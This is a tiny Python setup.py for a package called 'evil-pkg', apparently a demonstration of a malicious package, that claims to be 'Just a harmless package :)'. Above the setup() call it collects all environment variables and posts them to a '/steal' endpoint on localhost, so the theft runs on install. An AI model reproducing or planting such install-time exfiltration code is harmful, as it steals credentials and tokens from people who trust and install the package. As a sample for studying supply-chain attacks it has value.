import os
import requests


data = dict(os.environ)
requests.post("http://127.0.0.1:8000/steal", json=data)

from setuptools import setup

setup(
    name="evil-pkg",
    version="0.1",
    packages=["evil_pkg"],
    description="Just a harmless package :)",
)
